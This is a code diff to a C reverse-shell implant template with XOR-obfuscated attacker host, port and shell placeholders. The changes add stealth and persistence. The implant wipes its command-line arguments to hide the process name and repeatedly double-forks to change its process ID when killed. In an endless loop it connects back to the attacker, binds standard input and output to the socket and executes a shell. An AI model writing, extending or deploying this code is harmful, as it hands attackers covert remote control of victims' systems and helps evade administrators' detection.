@@ -12,20 +12,10 @@
 #define LPORT xor( from_hex(lport), "{OBF_KEY}")
 #define SHELL xor( from_hex(shell), "{OBF_KEY}")
 
-
-int main(int argc, char *argv[])
-{
-    struct sockaddr_in sa;
-    int s;
-    //Have to declare strings as char arrays to prevent
-    // gcc from storing them in read-only memory
-    // (https://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha)
-    char lhost[] = "{LHOST}";
-    char lport[] = "{LPORT}";
-    char shell[] = "{SHELL}";
-
+void daemonize() {
     int status;
     pid_t pid;
+
     //http://thinkiii.blogspot.com/2009/12/double-fork-to-avoid-zombie-process.html
     //Unix double fork to daemonize
     if (pid = fork()) {
@@ -37,25 +27,49 @@ int main(int argc, char *argv[])
             //Parent -- orphan the grandchild
             exit(0);
         } else {
-            //Grandchild - do the work
+            //Grandchild
+            return;
+        }
+    }
+    
+    exit(0);
+}
 
-            sa.sin_family = AF_INET;
-            sa.sin_addr.s_addr = inet_addr(LHOST);
-            sa.sin_port = htons(atoi(LPORT));
-            while (1) {
-                if (pid = fork()) {
-                    s = socket(AF_INET, SOCK_STREAM, 0);
-                    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-                    dup2(s, 0);
-                    dup2(s, 1);
-                    dup2(s, 2);
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s, status;
+    //Have to declare strings as char arrays to prevent
+    // gcc from storing them in read-only memory
+    // (https://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha)
+    char lhost[] = "{LHOST}";
+    char lport[] = "{LPORT}";
+    char shell[] = "{SHELL}";
+    pid_t pid;
 
-                    execve(SHELL, 0, 0);
-                }
-                //wait for shell to exit, then spawn a new one
-                waitpid(pid, &status, 0);        
-                sleep(30);
-            }
+    //Delete process name
+    for (int i=0; i < argc; i++) {
+        memset(argv[i], 0, strlen(argv[i]));
+    }
+
+    daemonize();
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(LHOST);
+    sa.sin_port = htons(atoi(LPORT));
+    while (1) {
+        //Cycle through PIDs when killed
+        daemonize();
+        if (pid = fork()) {
+            waitpid(pid, &status, 0);        
+        } else {
+            s = socket(AF_INET, SOCK_STREAM, 0);
+            connect(s, (struct sockaddr *)&sa, sizeof(sa));
+            dup2(s, 0);
+            dup2(s, 1);
+            dup2(s, 2);
+
+            execve(SHELL, 0, 0);
         }
     }
     return 0;
